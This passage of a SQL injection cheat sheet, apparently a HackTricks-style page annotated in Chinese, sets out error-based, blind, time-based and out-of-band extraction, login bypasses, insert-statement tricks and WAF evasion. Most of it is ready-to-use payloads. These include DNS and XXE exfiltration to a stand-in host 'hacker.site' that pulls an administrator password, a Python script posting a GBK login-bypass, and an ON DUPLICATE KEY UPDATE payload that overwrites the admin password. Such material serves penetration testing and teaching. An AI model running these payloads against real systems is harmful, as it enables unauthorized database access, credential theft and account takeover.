class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+-----------------+------+---------+------+-----------+-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">87</span> <span class="operator">|</span> root <span class="operator">|</span> localhost:<span class="number">56330</span> <span class="operator">|</span> test <span class="operator">|</span> Query   <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span> executing <span class="operator">|</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.`PROCESSLIST` <span class="keyword">where</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+-----------------+------+---------+------+-----------+-----------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure>

<p>Complete Article: <a href="https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f">https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f</a></p>
<h2 id="Exploiting-Error-based"><a href="#Exploiting-Error-based" class="headerlink" title="Exploiting Error based"></a>Exploiting Error based</h2><p>If for some reason you <strong>cannot</strong> see the <strong>output</strong> of the <strong>query</strong> but you can <strong>see the error messages</strong>, <strong>you can make this error messages to <strong>ex-filtrate</strong> data from the database.【大意：定制错误消息，需要在触发报错语句之前执行某些语句，并将执行结果拼接到触发的报错语句中，通过报错泄露执行结果】</strong><br>Following a similar flow as in the Union Based exploitation you could manage to dump the DB.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="built_in">floor</span>() 报错原理：https:<span class="operator">/</span><span class="operator">/</span>www.secpulse.com<span class="operator">/</span>archives<span class="operator">/</span><span class="number">140616.</span>html</span><br><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">and</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(CONCAT(@<span class="variable">@VERSION</span>),<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>)a <span class="keyword">group</span> <span class="keyword">by</span> x limit <span class="number">1</span>))</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">4</span>)y <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br></pre></td></tr></table></figure>

<h2 id="Exploiting-Blind-SQLi"><a href="#Exploiting-Blind-SQLi" class="headerlink" title="Exploiting Blind SQLi"></a>Exploiting Blind SQLi</h2><p>In this case you cannot see the results of the query or the errors, but you can <strong>distinguished【区分】</strong> when the query <strong>return</strong> a <strong>true</strong> or a <strong>false</strong> response because there are different contents on the page.<br>In this case, you can <strong>abuse【利用】</strong> that behaviour to dump the database char by char:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.tables <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Exploiting-Error-Blind-SQLi"><a href="#Exploiting-Error-Blind-SQLi" class="headerlink" title="Exploiting Error Blind SQLi"></a>Exploiting Error Blind SQLi</h2><p>This is the <strong>same case as before</strong> but instead of distinguish between a true&#x2F;false response from the query you can <strong>distinguish between</strong> an <strong>error</strong> in the SQL query or not (maybe because the HTTP server crashes). Therefore, in this case you can force an SQLerror each time you guess correctly the char:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> IF(<span class="number">1</span>,(<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables),<span class="string">&#x27;a&#x27;</span>))<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h2 id="Exploiting-Time-Based-SQLi"><a href="#Exploiting-Time-Based-SQLi" class="headerlink" title="Exploiting Time Based SQLi"></a>Exploiting Time Based SQLi</h2><p>In this case there <strong>isn’t</strong> any way to <strong>distinguish</strong> the <strong>response</strong> of the query based on the context of the page. But, you can make the page <strong>take longer to load</strong> if the guessed character is correct. We have already saw this technique in use before in order to <a href="./#confirming-with-timing">confirm a SQLi vuln</a>.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> users <span class="keyword">where</span> SUBSTR(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>)#</span><br></pre></td></tr></table></figure>

<h2 id="Stacked-Queries"><a href="#Stacked-Queries" class="headerlink" title="Stacked Queries"></a>Stacked Queries</h2><p>You can use stacked queries to <strong>execute multiple queries in succession【连续执行多个查询】</strong>. Note that while the subsequent queries are executed, the <strong>results</strong> are <strong>not returned to the application</strong>. <strong>Hence【因此】</strong> this technique is <strong>primarily【主要是】</strong> of use in relation to <strong>blind vulnerabilities</strong> where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
<p><strong>Oracle</strong> doesn’t support <strong>stacked queries.</strong> <strong>MySQL</strong>, <strong>Microsoft</strong> and <strong>PostgreSQL</strong> support them: <code>QUERY-1-HERE; QUERY-2-HERE</code></p>
<h2 id="Out-of-band-Exploitation"><a href="#Out-of-band-Exploitation" class="headerlink" title="Out of band Exploitation"></a>Out of band Exploitation</h2><p>If <strong>no-other</strong> exploitation method <strong>worked</strong>, you may try to make the database <strong>ex-filtrate【泄露】</strong> the info to an <strong>external host【外部主机】</strong> controlled by you. For example, via DNS queries:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># MySQL</span><br><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,version(),<span class="string">&#x27;.hacker.site\\a.txt&#x27;</span>));</span><br></pre></td></tr></table></figure>

<h3 id="Out-of-band-data-exfiltration-via-XXE"><a href="#Out-of-band-data-exfiltration-via-XXE" class="headerlink" title="Out of band data exfiltration via XXE"></a>Out of band data exfiltration via XXE</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># Oracle</span><br><span class="line">a<span class="string">&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span>?xml version<span class="operator">=</span>&quot;1.0&quot; encoding<span class="operator">=</span>&quot;UTF-8&quot;?<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE root [ <span class="operator">&lt;</span><span class="operator">!</span>ENTITY <span class="operator">%</span> remote <span class="keyword">SYSTEM</span> &quot;http://&#x27;||(SELECT password FROM users WHERE username=&#x27;administrator&#x27;)||&#x27;.hacker.site/&quot;<span class="operator">&gt;</span> <span class="operator">%</span>remote;]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;) FROM dual-- -</span></span><br></pre></td></tr></table></figure>

<h2 id="Automated-Exploitation"><a href="#Automated-Exploitation" class="headerlink" title="Automated Exploitation"></a>Automated Exploitation</h2><p>Check the <a href="sqlmap/">SQLMap Cheetsheat</a> to exploit a SQLi vulnerability with <a href="https://github.com/sqlmapproject/sqlmap"><strong>sqlmap</strong></a>.</p>
<h2 id="Tech-specific-info"><a href="#Tech-specific-info" class="headerlink" title="Tech specific info"></a>Tech specific info</h2><p>We have already discussed all the ways to exploit a SQLinjection vulnerability. Find some more tricks database technology dependant in this book:</p>
<ul>
<li><a href="mysql-injection/">MySQL</a></li>
<li><a href="postgresql-injection/">PostgreSQL</a></li>
</ul>
<p>Or you will find <strong>a lot of tricks regarding: MySQL, PostgreSQL, Oracle, MSSQL, SQLite and HQL in</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"><strong>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</strong></a></p>
<h2 id="Authentication-bypass"><a href="#Authentication-bypass" class="headerlink" title="Authentication bypass"></a>Authentication bypass</h2><p>List to try to bypass the login functionality:</p>
<p>content-ref url&#x3D;”..&#x2F;login-bypass&#x2F;sql-login-bypass.md”<br><a href="../login-bypass/sql-login-bypass.md">sql-login-bypass.md</a><br>ndcontent-ref</p>
<h3 id="Authentication-Bypass-Raw-MD5"><a href="#Authentication-Bypass-Raw-MD5" class="headerlink" title="Authentication Bypass (Raw MD5)"></a>Authentication Bypass (Raw MD5)</h3><p>When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;SELECT * FROM admin WHERE pass = &#x27;&quot;.md5($password,<span class="literal">true</span>).&quot;&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>Allowing an attacker to <strong>craft a string【制作一个字符串】</strong> with a <code>true</code> statement such as <code>&#39; or &#39;SOMETHING</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">md5(&quot;ffifdyop&quot;, <span class="literal">true</span>) <span class="operator">=</span> <span class="string">&#x27;or&#x27;</span><span class="number">6</span>É]é<span class="operator">!</span>r,ùíb</span><br></pre></td></tr></table></figure>

<p>Challenge demo available at <a href="http://web.jarvisoj.com:32772/">http://web.jarvisoj.com:32772</a></p>
<h3 id="Hash-Authentication-Bypass"><a href="#Hash-Authentication-Bypass" class="headerlink" title="Hash Authentication Bypass"></a>Hash Authentication Bypass</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; AND 1=0 UNION ALL SELECT &#x27;</span>admin<span class="string">&#x27;, &#x27;</span><span class="number">81</span>dc9bdb52d04dc20036dbd8313ed055<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>Recommended list</strong>:</p>
<p>You should use as username each line of the list and as password always: _<strong>Pass1234.</strong>_<br><em>(This payloads are also included in the big list mentioned at the beginning of this section)</em></p>
<p>file src&#x3D;”..&#x2F;..&#x2F;.gitbook&#x2F;assets&#x2F;sqli-hashbypass.txt”</p>
<h3 id="GBK-Authentication-Bypass"><a href="#GBK-Authentication-Bypass" class="headerlink" title="GBK Authentication Bypass"></a>GBK Authentication Bypass</h3><p>IF ‘ is being scaped you can use %A8%27, and when ‘ gets scaped it will be created: 0xA80x5c0x27 (<em>╘’</em>)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span>A8<span class="operator">%</span><span class="number">27</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;<span class="comment">-- 2</span></span><br><span class="line"><span class="operator">%</span><span class="number">8</span>C<span class="operator">%</span>A8<span class="operator">%</span><span class="number">27</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">-- 2</span></span><br><span class="line"><span class="operator">%</span>bf<span class="string">&#x27; or 1=1 -- --</span></span><br></pre></td></tr></table></figure>

<p>Python script:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://example.com/index.php&quot;</span> </span><br><span class="line">cookies = <span class="built_in">dict</span>(PHPSESSID=<span class="string">&#x27;4j37giooed20ibi12f3dqjfbkp3&#x27;</span>) </span><br><span class="line">datas = &#123;<span class="string">&quot;login&quot;</span>: <span class="built_in">chr</span>(<span class="number">0xbf</span>) + <span class="built_in">chr</span>(<span class="number">0x27</span>) + <span class="string">&quot;OR 1=1 #&quot;</span>, <span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>&#125; </span><br><span class="line">r = requests.post(url, data = datas, cookies=cookies, headers=&#123;<span class="string">&#x27;referrer&#x27;</span>:url&#125;) </span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>

<h3 id="Polyglot-injection【多语境注入】-multicontext"><a href="#Polyglot-injection【多语境注入】-multicontext" class="headerlink" title="Polyglot injection【多语境注入】 (multicontext)"></a>Polyglot injection【多语境注入】 (multicontext)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">SLEEP(<span class="number">1</span>) <span class="comment">/*&#x27; or SLEEP(1) or &#x27;&quot; or SLEEP(1) or &quot;*/</span></span><br></pre></td></tr></table></figure>

<h2 id="Insert-Statement"><a href="#Insert-Statement" class="headerlink" title="Insert Statement"></a>Insert Statement</h2><h3 id="Modify-password-of-existing-object-x2F-user"><a href="#Modify-password-of-existing-object-x2F-user" class="headerlink" title="Modify password of existing object&#x2F;user"></a>Modify password of existing object&#x2F;user</h3><p>To do so you should try to <strong>create a new object named as the “master object”</strong> (probably <strong>admin</strong> in case of users) modifying something:</p>
<ul>
<li>Create user named: <strong>AdMIn</strong> (uppercase &amp; lowercase letters)</li>
<li>Create a user named: <strong>admin&#x3D;</strong></li>
<li><strong>SQL Truncation Attack【sql截断攻击】</strong> (when there is some kind of <strong>length limit</strong> in the username or email) –&gt; Create user with name: <strong>admin [a lot of spaces] a</strong></li>
</ul>
<h4 id="SQL-Truncation-Attack"><a href="#SQL-Truncation-Attack" class="headerlink" title="SQL Truncation Attack"></a>SQL Truncation Attack</h4><p>If the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user <strong>admin</strong>, try to create a username called: “<em>admin [30 spaces] a</em>“ and any password.</p>
<p>The database will <strong>check</strong> if the introduced <strong>username</strong> <strong>exists</strong> inside the database. If <strong>not</strong>, it will <strong>cut</strong> the <strong>username</strong> to the <strong>max allowed number of characters</strong> (in this case to: “<em>admin [25 spaces]</em>“) and the it will <strong>automatically remove all the spaces at the end updating</strong> inside the database the user “<strong>admin</strong>“ with the <strong>new password</strong> (some error could appear but it doesn’t means that this hasn’t worked).</p>
<p>More info: <a href="https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html">https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html</a> &amp; <a href="https://resources.infosecinstitute.com/sql-truncation-attack/#gref">https://resources.infosecinstitute.com/sql-truncation-attack/#gref</a></p>
<p><em>Note: This attack will no longer work as described above in latest MySQL installations. While comparisons still ignore trailing whitespace by default, attempting to insert a string that is longer than the length of a field will result in an error, and the insertion will fail. For more information about about this check</em> <a href="https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation"><em>https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation</em></a>__</p>
<h3 id="MySQL-Insert-time-based-checking"><a href="#MySQL-Insert-time-based-checking" class="headerlink" title="MySQL Insert time based checking"></a>MySQL Insert time based checking</h3><p><strong>Add as much <code>&#39;,&#39;&#39;,&#39;&#39;</code> as you consider to exit the VALUES statement【大意：添加足够的 <code>&#39;,&#39;&#39;,&#39;&#39;</code>，用以闭合 VALUES 语境】</strong>. If delay is executed, you have a SQLInjection.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">name<span class="operator">=</span><span class="string">&#x27;,&#x27;&#x27;);WAITFOR%20DELAY%20&#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">5</span><span class="string">&#x27;--%20-</span></span><br></pre></td></tr></table></figure>

<h3 id="ON-DUPLICATE-KEY-UPDATE"><a href="#ON-DUPLICATE-KEY-UPDATE" class="headerlink" title="ON DUPLICATE KEY UPDATE"></a>ON DUPLICATE KEY UPDATE</h3><p>ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Inject using payload:</span><br><span class="line">attacker_dummy@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;), (&quot;admin@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;) ON DUPLICATE KEY UPDATE password=&quot;bcrypt_hash_of_qwerty&quot; --</span><br><span class="line"></span><br><span class="line">The query would look like this:</span><br><span class="line">INSERT INTO users (email, password) VALUES (&quot;attacker_dummy@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;), (&quot;admin@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;) ON DUPLICATE KEY UPDATE password=&quot;bcrypt_hash_of_qwerty&quot; -- &quot;, &quot;bcrypt_hash_of_your_password_input&quot;);</span><br><span class="line"></span><br><span class="line">This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.</span><br><span class="line">Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to &quot;bcrypt_hash_of_qwerty&quot;.</span><br><span class="line"></span><br><span class="line">After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!</span><br></pre></td></tr></table></figure>

<h3 id="Extract-information"><a href="#Extract-information" class="headerlink" title="Extract information"></a>Extract information</h3><h4 id="Creating-2-accounts-at-the-same-time"><a href="#Creating-2-accounts-at-the-same-time" class="headerlink" title="Creating 2 accounts at the same time"></a>Creating 2 accounts at the same time</h4><p>When trying to create a new user and username, password and email are needed:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQLi payload:</span><br><span class="line">username=TEST&amp;password=TEST&amp;email=TEST&#x27;),(&#x27;otherUsername&#x27;,&#x27;otherPassword&#x27;,(select flag from flag limit 1))-- -</span><br><span class="line"></span><br><span class="line">A new user with username=otherUsername, password=otherPassword, email:FLAG will be created</span><br></pre></td></tr></table></figure>

<h4 id="Using-decimal-or-hexadecimal"><a href="#Using-decimal-or-hexadecimal" class="headerlink" title="Using decimal or hexadecimal"></a>Using decimal or hexadecimal</h4><p>With this technique you can extract information creating only 1 account. It is important to note that you don’t need to comment anything.</p>
<p>Using <strong>hex2dec</strong> and <strong>substr</strong>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+&#x27;</span></span><br></pre></td></tr></table></figure>

<p>To get the text you can use:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;binascii&#x27;</span>).unhexlify(<span class="built_in">hex</span>(<span class="number">215573607263</span>)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>

<p>Using <strong>hex</strong> and <strong>replace</strong> (and <strong>substr</strong>):</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+(select hex(replace(replace(replace(replace(replace(replace(table_name,&quot;j&quot;,&quot; &quot;),&quot;k&quot;,&quot;!&quot;),&quot;l&quot;,&quot;\&quot;&quot;),&quot;m&quot;,&quot;#&quot;),&quot;o&quot;,&quot;$&quot;),&quot;_&quot;,&quot;%&quot;)) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),&quot;j&quot;,&quot; &quot;),&quot;k&quot;,&quot;!&quot;),&quot;l&quot;,&quot;\&quot;&quot;),&quot;m&quot;,&quot;#&quot;),&quot;o&quot;,&quot;$&quot;),&quot;_&quot;,&quot;%&quot;)) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+&#x27;</span></span><br><span class="line"></span><br><span class="line">#<span class="keyword">Full</span> ascii uppercase <span class="keyword">and</span> lowercase replace:</span><br><span class="line"><span class="string">&#x27;+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),&quot;j&quot;,&quot; &quot;),&quot;k&quot;,&quot;!&quot;),&quot;l&quot;,&quot;\&quot;&quot;),&quot;m&quot;,&quot;#&quot;),&quot;o&quot;,&quot;$&quot;),&quot;_&quot;,&quot;%&quot;),&quot;z&quot;,&quot;&amp;&quot;),&quot;J&quot;,&quot;&#x27;</span>&quot;),&quot;K&quot;,&quot;`&quot;),&quot;L&quot;,&quot;(&quot;),&quot;M&quot;,&quot;)&quot;),&quot;N&quot;,&quot;@&quot;),&quot;O&quot;,&quot;$$&quot;),&quot;Z&quot;,&quot;<span class="operator">&amp;&amp;</span>&quot;)) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Routed-SQL-injection"><a href="#Routed-SQL-injection" class="headerlink" title="Routed SQL injection"></a>Routed SQL injection</h2><p>Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. (<a href="http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt">Paper</a>)<br><strong>“Routed SQL injection”</strong> 情况与 <strong>“Exploiting Hidden Union Based”</strong> 介绍文章第三种情况一样。</p>
<p><a href="http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt">Paper</a> 中的演示代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$db_database</span> = <span class="string">&quot;finecms&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$db_database</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;SELECT uid,password FROM fn_member WHERE uid=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>,<span class="variable">$conn</span>))<span class="keyword">die</span>(<span class="string">&quot;Error While Selection process : &quot;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>) == <span class="number">0</span>)<span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;SELECT username FROM fn_member WHERE password=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;font color=red&gt;This is the query which gives you Output : &lt;/font&gt;<span class="subst">$query</span>&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>,<span class="variable">$conn</span>))<span class="keyword">die</span>(<span class="string">&quot;Error While Selection process : &quot;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>) == <span class="number">0</span>)<span class="keyword">die</span>(<span class="string">&quot;Invalid Input parameter&quot;</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Username is : &#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#Hex <span class="keyword">of</span>: <span class="number">-1</span><span class="string">&#x27; union select login,password from users-- a</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061</span> <span class="comment">-- a</span></span><br></pre></td></tr></table></figure>

<h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><h3 id="No-spaces-bypass"><a href="#No-spaces-bypass" class="headerlink" title="No spaces bypass"></a>No spaces bypass</h3><p>No Space (%20) - bypass using whitespace alternatives</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">09</span><span class="keyword">and</span><span class="operator">%</span><span class="number">091</span><span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">09</span><span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>Dand<span class="operator">%</span><span class="number">0</span>D1<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>D<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>Cand<span class="operator">%</span><span class="number">0</span>C1<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>C<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>Band<span class="operator">%</span><span class="number">0</span>B1<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>B<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>Aand<span class="operator">%</span><span class="number">0</span>A1<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>A<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>A0and<span class="operator">%</span>A01<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>A0<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>No Whitespace - bypass using comments</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="comment">/*comment*/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>No Whitespace - bypass using parenthesis</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span>(<span class="number">1</span>)<span class="keyword">and</span>(<span class="number">1</span>)<span class="operator">=</span>(<span class="number">1</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h3 id="No-commas-bypass"><a href="#No-commas-bypass" class="headerlink" title="No commas bypass"></a>No commas bypass</h3><p>No Comma - bypass using OFFSET, FROM and JOIN</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LIMIT 0,1         -&gt; LIMIT 1 OFFSET 0</span><br><span class="line">SUBSTR(&#x27;SQL&#x27;,1,1) -&gt; SUBSTR(&#x27;SQL&#x27; FROM 1 FOR 1).</span><br><span class="line">SELECT 1,2,3,4    -&gt; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d</span><br></pre></td></tr></table></figure>

<h3 id="Generic-Bypasses"><a href="#Generic-Bypasses" class="headerlink" title="Generic Bypasses"></a>Generic Bypasses</h3><p>Blacklist using keywords - bypass using uppercase&#x2F;lowercase</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AnD</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">aNd</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>

<p>Blacklist using keywords case insensitive - bypass using an equivalent operator</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND   -&gt; &amp;&amp; -&gt; %26%26</span><br><span class="line">OR    -&gt; || -&gt; %7C%7C</span><br><span class="line">=     -&gt; LIKE,REGEXP,RLIKE, not &lt; and not &gt;</span><br><span class="line">&gt; X   -&gt; not between 0 and X</span><br><span class="line">WHERE -&gt; HAVING --&gt; LIMIT X,1 -&gt; group_concat(CASE(table_schema)When(database())Then(table_name)END) -&gt; group_concat(if(table_schema=database(),table_name,null))</span><br></pre></td></tr></table></figure>

